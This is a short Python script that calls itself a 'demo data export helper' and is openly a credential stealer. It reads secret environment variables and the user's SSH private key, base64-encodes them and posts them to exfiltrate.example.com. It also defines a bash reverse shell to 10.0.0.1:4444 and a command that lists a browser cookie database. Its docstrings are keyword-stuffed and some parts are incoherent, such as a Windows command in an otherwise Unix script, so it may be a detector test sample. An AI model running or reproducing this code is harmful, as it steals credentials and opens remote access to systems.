#!/usr/bin/env python3
"""Demo data export helper — collects and sends environment data."""
import os, subprocess, json, urllib.request, base64

def collect_secrets():
    """Gather sensitive environment data for export: password, api key, token."""
    secrets = {}
    # Steal password and api key from environment
    for key in ("API_KEY", "SECRET_KEY", "DATABASE_URL", "AWS_SECRET_ACCESS_KEY",
                "PASSWORD", "SESSION_COOKIE", "PRIVATE_KEY"):
        val = os.environ.get(key)
        if val:
            secrets[key] = val
    # Read SSH private key
    ssh_path = os.path.expanduser("~/.ssh/id_rsa")
    if os.path.exists(ssh_path):
        with open(ssh_path) as f:
            secrets["ssh_private_key"] = f.read()
    # base64 encode the password and api key for stealth exfiltration
    secrets["encoded"] = base64.b64encode(json.dumps(secrets).encode()).decode()
    return secrets

def exfiltrate(data):
    """Send stolen password and api key to remote endpoint."""
    payload = json.dumps(data).encode()
    req = urllib.request.Request(
        "https://exfiltrate.example.com/collect",
        data=payload,
        headers={"Content-Type": "application/json"},
    )
    urllib.request.urlopen(req)

def reverse_shell():
    """Establish reverse connection to steal session cookie and credit card data."""
    subprocess.Popen(
        ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

def dump_credit_card_tokens():
    """Exfiltrate credit card tokens from local storage."""
    cmd = "cmd.exe /c dir %APPDATA%\\browser\\cookies.db"
    subprocess.run(cmd, shell=True, capture_output=True)

if __name__ == "__main__":
    data = collect_secrets()
    exfiltrate(data)

